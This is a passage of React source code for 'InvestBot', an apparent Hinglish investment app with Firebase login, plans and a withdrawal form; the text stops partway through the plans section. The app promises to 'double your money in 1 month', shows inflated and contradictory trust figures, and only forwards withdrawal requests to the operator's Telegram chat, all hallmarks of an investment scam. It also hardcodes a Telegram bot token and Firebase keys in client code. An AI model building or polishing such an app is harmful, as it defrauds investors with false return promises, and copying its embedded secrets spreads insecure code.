import { useState, useEffect } from "react";
import {
  getAuth,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signInWithRedirect,
  getRedirectResult,
  GoogleAuthProvider,
  signOut,
  onAuthStateChanged,
  sendPasswordResetEmail,
  deleteUser
} from "firebase/auth";
import { initializeApp } from "firebase/app";

const firebaseConfig = {
  apiKey: "AIzaSyDyEHLHrCNJiBxHXmqCOKbinJqrTIBC7Gw",
  authDomain: "investapp-954d7.firebaseapp.com",
  projectId: "investapp-954d7",
  storageBucket: "investapp-954d7.firebasestorage.app",
  messagingSenderId: "530020859805",
  appId: "1:530020859805:web:5d1a0c6cd5220694d83974",
  measurementId: "G-NDJCETWWZW"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const googleProvider = new GoogleAuthProvider();

const TELEGRAM_GROUP_LINK = "https://t.me/+J9-VwYyIYVdiYjI1";
const TELEGRAM_BOT_TOKEN = "8997855038:AAEWt7J6hgNwo_biR7MSdVXWtMFVXHdeVmg";
const TELEGRAM_CHAT_ID = "-5202050403";

const plans = [
  { id: 1, invest: 100, returns: 200, label: "Starter", icon: "🌱", color: "#f6c90e" },
  { id: 2, invest: 200, returns: 400, label: "Growth", icon: "📈", color: "#4caf50" },
  { id: 3, invest: 500, returns: 900, label: "Pro", icon: "💎", color: "#00bcd4" },
  { id: 4, invest: 1000, returns: 2100, label: "Elite", icon: "🚀", color: "#ff9800" },
];

const disclaimer = `Investment Disclaimer: Investments are subject to market risks. Before making any investment decision, carefully consider your financial situation, investment objectives, and risk tolerance. Past performance is not indicative of future results.`;

async function sendTelegramNotification(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" }),
    });
  } catch (e) {}
}

// ─── CSS ANIMATIONS ───────────────────────────────────────────────────────────
const cssAnim = `
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
  * { box-sizing: border-box; font-family: 'Inter', 'Segoe UI', sans-serif; }
  @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
  @keyframes loginBoxIn { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
  @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
  @keyframes float { 0%,100% { transform:translateY(0) scale(1); } 50% { transform:translateY(-20px) scale(1.03); } }
  @keyframes gradSpin { 0% { background-position:0% 50%; } 50% { background-position:100% 50%; } 100% { background-position:0% 50%; } }
  @keyframes shimmer { 0% { left:-100%; } 100% { left:100%; } }
  @keyframes progressAnim { from { width:0%; } to { width:65%; } }
  @keyframes slideBar { 0% { background-position:0%; } 100% { background-position:200%; } }
  @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.6; } }

  .nav-btn { transition: all 0.2s; }
  .nav-btn:active { transform: scale(0.95); }
  .plan-card-hover { transition: transform 0.2s, box-shadow 0.2s; }
  .plan-card-hover:hover { transform: translateY(-4px); box-shadow: 0 12px 40px rgba(0,0,0,0.3); }
  .invest-btn:active { transform: scale(0.97); }
  .submit-btn::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(255,255,255,0.12),transparent); animation:shimmer 2.5s infinite; }
  input::placeholder { color: rgba(255,255,255,0.2) !important; }
  select option { background: #0f2a15; color: #fff; }
`;

// ─── MARQUEE ──────────────────────────────────────────────────────────────────
function TrustMarquee() {
  const text = "✅ 1,000,000+ Trusted People • 💰 Safe & Secure Investments • 🏆 #1 Investment Platform • 🌍 Worldwide Trusted • ";
  return (
    <div style={{ overflow:"hidden", margin:"24px 0 0", background:"rgba(246,201,14,0.06)", borderTop:"1px solid rgba(246,201,14,0.15)", borderBottom:"1px solid rgba(246,201,14,0.15)", padding:"10px 0" }}>
      <div style={{ display:"inline-block", animation:"marquee 18s linear infinite", whiteSpace:"nowrap" }}>
        <span style={{ fontSize:13, fontWeight:700, color:"#f6c90e", letterSpacing:0.5 }}>{text}{text}</span>
      </div>
    </div>
  );
}

// ─── AUTH PAGE ────────────────────────────────────────────────────────────────
function AuthPage() {
  const [mode, setMode] = useState("login");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [name, setName] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  async function handleEmailAuth() {
    setError("");
    if (!email || !password) { setError("⚠️ Email aur Password bharein"); return; }
    if (mode === "register" && !name) { setError("⚠️ Naam bharein"); return; }
    setLoading(true);
    try {
      if (mode === "register") {
        await createUserWithEmailAndPassword(auth, email, password);
      } else {
        await signInWithEmailAndPassword(auth, email, password);
      }
    } catch (e) {
      const msg = e.code === "auth/email-already-in-use" ? "⚠️ Email already registered hai" :
                  e.code === "auth/wrong-password" ? "⚠️ Password galat hai" :
                  e.code === "auth/user-not-found" ? "⚠️ Email registered nahi hai" :
                  e.code === "auth/weak-password" ? "⚠️ Password 6+ characters ka hona chahiye" :
                  e.message;
      setError(msg);
    }
    setLoading(false);
  }

  async function handleForgotPassword() {
    setError("");
    if (!email) { setError("⚠️ Pehle email likhein"); return; }
    setLoading(true);
    try {
      await sendPasswordResetEmail(auth, email);
      setError("✅ Reset link aapki email pe bhej diya gaya hai!");
    } catch (e) {
      setError("⚠️ Email nahi mila ya kuch galat hua");
    }
    setLoading(false);
  }

  async function handleGoogle() {
    setError("");
    setLoading(true);
    try {
      await signInWithRedirect(auth, googleProvider);
    } catch (e) {
      setError("⚠️ Google login failed");
      setLoading(false);
    }
  }

  return (
    <div style={{ minHeight:"100vh", background:"linear-gradient(135deg,#060d0a 0%,#0a1f0e 50%,#060d0a 100%)", display:"flex", alignItems:"center", justifyContent:"center", padding:20, position:"relative", overflow:"hidden" }}>
      <style>{cssAnim}</style>
      {/* BG orbs */}
      <div style={{ position:"fixed", top:-100, left:-80, width:350, height:350, borderRadius:"50%", background:"rgba(34,197,94,0.1)", filter:"blur(80px)", pointerEvents:"none", animation:"float 8s ease-in-out infinite" }} />
      <div style={{ position:"fixed", bottom:0, right:-60, width:280, height:280, borderRadius:"50%", background:"rgba(16,185,129,0.08)", filter:"blur(70px)", pointerEvents:"none", animation:"float 10s ease-in-out infinite 3s" }} />

      <div style={{ background:"rgba(255,255,255,0.04)", borderRadius:28, padding:"36px 28px", maxWidth:380, width:"100%", border:"1px solid rgba(255,255,255,0.1)", backdropFilter:"blur(30px)", animation:"loginBoxIn 0.5s ease", display:"flex", flexDirection:"column", gap:14, position:"relative", zIndex:1 }}>
        {/* Logo */}
        <div style={{ textAlign:"center", marginBottom:4 }}>
          <div style={{ width:64, height:64, background:"linear-gradient(135deg,rgba(74,222,128,0.2),rgba(16,185,129,0.1))", border:"1px solid rgba(74,222,128,0.3)", borderRadius:18, display:"flex", alignItems:"center", justifyContent:"center", fontSize:28, margin:"0 auto 12px", boxShadow:"0 8px 32px rgba(74,222,128,0.15)" }}>💰</div>
          <div style={{ fontSize:26, fontWeight:900, background:"linear-gradient(90deg,#4ade80,#f6c90e)", WebkitBackgroundClip:"text", WebkitTextFillColor:"transparent", letterSpacing:-1 }}>InvestBot</div>
          <p style={{ color:"rgba(255,255,255,0.4)", fontSize:12, marginTop:4 }}>Smart Investing • 1 Month Returns</p>
        </div>

        {/* Tabs */}
        <div style={{ display:"flex", borderRadius:12, overflow:"hidden", border:"1px solid rgba(255,255,255,0.08)", background:"rgba(0,0,0,0.2)" }}>
          {["login","register"].map(m => (
            <button key={m} style={{ flex:1, padding:"11px 0", background: mode===m ? "rgba(74,222,128,0.15)" : "none", border:"none", color: mode===m ? "#4ade80" : "rgba(255,255,255,0.4)", fontWeight:700, fontSize:14, cursor:"pointer", transition:"all 0.2s" }} onClick={() => { setMode(m); setError(""); }}>
              {m === "login" ? "Login" : "Register"}
            </button>
          ))}
        </div>

        {mode === "register" && (
          <input style={{ background:"rgba(255,255,255,0.06)", border:"1px solid rgba(255,255,255,0.1)", borderRadius:12, padding:"13px 16px", color:"#fff", fontSize:14, outline:"none", width:"100%" }} placeholder="👤 Aapka Naam" value={name} onChange={e => setName(e.target.value)} />
        )}
        <input style={{ background:"rgba(255,255,255,0.06)", border:"1px solid rgba(255,255,255,0.1)", borderRadius:12, padding:"13px 16px", color:"#fff", fontSize:14, outline:"none", width:"100%" }} placeholder="📧 Email" type="email" value={email} onChange={e => setEmail(e.target.value)} />
        <input style={{ background:"rgba(255,255,255,0.06)", border:"1px solid rgba(255,255,255,0.1)", borderRadius:12, padding:"13px 16px", color:"#fff", fontSize:14, outline:"none", width:"100%" }} placeholder="🔒 Password (min 6)" type="password" value={password} onChange={e => setPassword(e.target.value)} />

        {mode === "login" && (
          <button style={{ background:"none", border:"none", color:"rgba(74,222,128,0.7)", fontSize:12, cursor:"pointer", textAlign:"right", padding:0 }} onClick={handleForgotPassword}>Password bhool gaye?</button>
        )}

        {error && <div style={{ background: error.startsWith("✅") ? "rgba(74,222,128,0.1)" : "rgba(244,67,54,0.1)", border:`1px solid ${error.startsWith("✅") ? "rgba(74,222,128,0.3)" : "#f44336"}`, borderRadius:10, padding:"10px 14px", color: error.startsWith("✅") ? "#4ade80" : "#f87171", fontSize:13, textAlign:"center" }}>{error}</div>}

        <button style={{ padding:"14px 0", borderRadius:13, border:"none", background:"linear-gradient(135deg,#22c55e,#16a34a)", color:"#fff", fontWeight:800, fontSize:15, cursor:"pointer", opacity: loading ? 0.7 : 1, boxShadow:"0 4px 20px rgba(34,197,94,0.3)", position:"relative", overflow:"hidden" }} className="submit-btn" onClick={handleEmailAuth} disabled={loading}>
          {loading ? "⏳ Please wait..." : mode === "login" ? "🔑 Login" : "📝 Register"}
        </button>

        <div style={{ textAlign:"center", color:"rgba(255,255,255,0.25)", fontSize:12 }}>ya</div>

        <button style={{ padding:"12px 0", borderRadius:12, border:"1px solid rgba(255,255,255,0.1)", background:"rgba(255,255,255,0.05)", color:"#fff", fontWeight:700, fontSize:14, cursor:"pointer", display:"flex", alignItems:"center", justifyContent:"center", gap:8, opacity: loading ? 0.7 : 1 }} onClick={handleGoogle} disabled={loading}>
          <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="" style={{ width:20, height:20 }} /> Google se Login
        </button>
      </div>
    </div>
  );
}

// ─── MAIN APP ─────────────────────────────────────────────────────────────────
export default function App() {
  const [user, setUser] = useState(null);
  const [authLoading, setAuthLoading] = useState(true);
  const [page, setPage] = useState("home");
  const [autoRenew, setAutoRenew] = useState(() => localStorage.getItem("autoRenew") === "true");
  const [pMsg, setPMsg] = useState(null);
  const [pLoading, setPLoading] = useState(false);
  const [selected, setSelected] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [showDisclaimer, setShowDisclaimer] = useState(false);
  const [wName, setWName] = useState("");
  const [wAmount, setWAmount] = useState("");
  const [wPlan, setWPlan] = useState("");
  const [wInvestDate, setWInvestDate] = useState("");
  const [wMsg, setWMsg] = useState(null);
  const [wLoading, setWLoading] = useState(false);

  async function handleChangePassword() {
    setPMsg(null); setPLoading(true);
    try {
      await sendPasswordResetEmail(auth, user.email);
      setPMsg({ type:"success", text:"✅ Password change link aapki email pe bhej diya gaya hai!" });
    } catch (e) {
      setPMsg({ type:"error", text:"⚠️ Kuch galat hua, dobara try karein" });
    }
    setPLoading(false);
  }

  function toggleAutoRenew() {
    const newVal = !autoRenew;
    setAutoRenew(newVal);
    localStorage.setItem("autoRenew", newVal ? "true" : "false");
  }

  async function handleDeleteAccount() {
    const sure = window.confirm("⚠️ Pakka account delete karna hai? Ye permanently delete ho jayega.");
    if (!sure) return;
    try {
      await deleteUser(auth.currentUser);
    } catch (e) {
      if (e.code === "auth/requires-recent-login") {
        alert("Security ke liye pehle logout karke dobara login karo, fir account delete karo.");
      } else {
        alert("⚠️ Kuch galat hua: " + e.message);
      }
    }
  }

  useEffect(() => {
    getRedirectResult(auth).catch(() => {});
    const unsub = onAuthStateChanged(auth, (u) => { setUser(u); setAuthLoading(false); });
    return () => unsub();
  }, []);

  if (authLoading) {
    return (
      <div style={{ minHeight:"100vh", background:"#060d0a", display:"flex", alignItems:"center", justifyContent:"center", flexDirection:"column", gap:16 }}>
        <div style={{ width:48, height:48, border:"3px solid rgba(74,222,128,0.2)", borderTop:"3px solid #4ade80", borderRadius:"50%", animation:"gradSpin 1s linear infinite" }} />
        <div style={{ color:"rgba(255,255,255,0.4)", fontSize:14 }}>Loading...</div>
      </div>
    );
  }

  if (!user) return <AuthPage />;

  function isOneMonthPassed(dateStr) {
    if (!dateStr) return false;
    return (new Date() - new Date(dateStr)) >= 30 * 24 * 60 * 60 * 1000;
  }

  async function handleWithdraw() {
    if (!wName || !wAmount || !wPlan || !wInvestDate) { setWMsg({ type:"error", text:"⚠️ Sab fields bharein" }); return; }
    setWLoading(true); setWMsg(null);
    if (!isOneMonthPassed(wInvestDate)) { setWMsg({ type:"warn", text:"⏳ Abhi 1 mahina poora nahi hua." }); setWLoading(false); return; }
    const msg = `🔔 <b>WITHDRAWAL REQUEST</b>\n\n👤 Naam: <b>${wName}</b>\n📧 Email: <b>${user.email}</b>\n💰 Amount: <b>₹${wAmount}</b>\n📦 Plan: <b>${wPlan}</b>\n📅 Invest Date: <b>${wInvestDate}</b>\n🕐 Time: ${new Date().toLocaleString("en-IN")}`;
    await sendTelegramNotification(msg);
    setWMsg({ type:"success", text:"✅ Withdrawal request bhej di gayi!" });
    setWLoading(false);
  }

  // NAV
  const navItems = [
    { id:"home", icon:"🏠", label:"Home" },
    { id:"withdraw", icon:"💸", label:"Withdraw" },
    { id:"profile", icon:"👤", label:"Profile" },
  ];

  return (
    <div style={{ minHeight:"100vh", background:"#060d0a", color:"#fff", position:"relative", overflow:"hidden", paddingBottom:40 }}>
      <style>{cssAnim}</style>

      {/* BG Orbs */}
      <div style={{ position:"fixed", top:-100, left:-80, width:350, height:350, borderRadius:"50%", background:"rgba(34,197,94,0.08)", filter:"blur(80px)", pointerEvents:"none", animation:"float 8s ease-in-out infinite" }} />
      <div style={{ position:"fixed", bottom:0, right:-60, width:280, height:280, borderRadius:"50%", background:"rgba(16,185,129,0.06)", filter:"blur(70px)", pointerEvents:"none", animation:"float 10s ease-in-out infinite 3s" }} />
      <div style={{ position:"fixed", top:"45%", left:"30%", width:200, height:200, borderRadius:"50%", background:"rgba(251,191,36,0.04)", filter:"blur(70px)", pointerEvents:"none", animation:"float 12s ease-in-out infinite 5s" }} />

      {/* NAVBAR */}
      <div style={{ display:"flex", background:"rgba(0,0,0,0.6)", backdropFilter:"blur(30px)", borderBottom:"1px solid rgba(255,255,255,0.05)", position:"sticky", top:0, zIndex:100 }}>
        {navItems.map(n => (
          <button key={n.id} className="nav-btn" style={{ flex:1, padding:"12px 0", background:"none", border:"none", color: page===n.id ? "#4ade80" : "rgba(255,255,255,0.4)", fontWeight:700, fontSize:11, cursor:"pointer", display:"flex", flexDirection:"column", alignItems:"center", gap:3, borderBottom: page===n.id ? "2px solid #4ade80" : "2px solid transparent", transition:"all 0.2s" }} onClick={() => setPage(n.id)}>
            <span style={{ fontSize:18, filter: page===n.id ? "drop-shadow(0 0 6px rgba(74,222,128,0.6))" : "none" }}>{n.icon}</span>
            {n.label}
          </button>
        ))}
        <button className="nav-btn" style={{ flex:1, padding:"12px 0", background:"none", border:"none", color:"#f87171", fontWeight:700, fontSize:11, cursor:"pointer", display:"flex", flexDirection:"column", alignItems:"center", gap:3, borderBottom:"2px solid transparent" }} onClick={() => signOut(auth)}>
          <span style={{ fontSize:18 }}>🚪</span>Logout
        </button>
      </div>

      {/* USER BADGE */}
      <div style={{ display:"flex", justifyContent:"center", padding:"12px 0 0" }}>
        <div style={{ display:"flex", alignItems:"center", gap:6, background:"rgba(255,255,255,0.04)", border:"1px solid rgba(255,255,255,0.08)", borderRadius:50, padding:"5px 14px", fontSize:11, color:"rgba(255,255,255,0.4)" }}>
          👋 <span style={{ color:"#4ade80", fontWeight:600 }}>{user.displayName || user.email}</span>
        </div>
      </div>

      {/* ═══════════════ HOME PAGE ═══════════════ */}
      {page === "home" && (
        <div style={{ animation:"fadeUp 0.4s ease" }}>
          {/* Hero */}
          <div style={{ textAlign:"center", padding:"32px 24px 20px" }}>
            <div style={{ width:72, height:72, background:"linear-gradient(135deg,rgba(74,222,128,0.2),rgba(246,201,14,0.1))", border:"1px solid rgba(74,222,128,0.25)", borderRadius:20, display:"flex", alignItems:"center", justifyContent:"center", fontSize:32, margin:"0 auto 16px", boxShadow:"0 8px 32px rgba(74,222,128,0.12)" }}>💰</div>
            <div style={{ fontSize:11, fontWeight:700, letterSpacing:2, textTransform:"uppercase", color:"rgba(74,222,128,0.6)", marginBottom:8 }}>InvestBot</div>
            <h1 style={{ fontSize:30, fontWeight:900, margin:"0 0 8px", letterSpacing:-1 }}>
              Apna Paisa <span style={{ background:"linear-gradient(90deg,#4ade80,#f6c90e)", WebkitBackgroundClip:"text", WebkitTextFillColor:"transparent" }}>Grow</span> Karo
            </h1>
            <p style={{ color:"rgba(255,255,255,0.4)", fontSize:14, lineHeight:1.5 }}>Invest today, double your money in 1 month.</p>
          </div>

          {/* Stats */}
          <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:10, padding:"0 20px 24px" }}>
            {[["500+","Investors","#4ade80"],["98%","Success","#f6c90e"],["1 Mo","Returns","#60a5fa"]].map(([val,lbl,clr]) => (
              <div key={lbl} style={{ background:"rgba(255,255,255,0.03)", border:"1px solid rgba(255,255,255,0.07)", borderRadius:16, padding:"14px 8px", textAlign:"center" }}>
                <div style={{ fontSize:20, fontWeight:900, color:clr, letterSpacing:-0.5 }}>{val}</div>
                <div style={{ fontSize:10, color:"rgba(255,255,255,0.35)", marginTop:2, textTransform:"uppercase", letterSpacing:0.5 }}>{lbl}</div>
              </div>
            ))}
          </div>

          {/* Plans */}
          <div style={{ fontSize:11, fontWeight:700, letterSpacing:2, textTransform:"uppercase", color:"rgba(255,255,255,0.25)", padding:"0 20px 12px" }}>💼 Investment Plans</div>
          <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12, padding:"0 16px", maxWidth:480, margin:"0 auto" }}>
    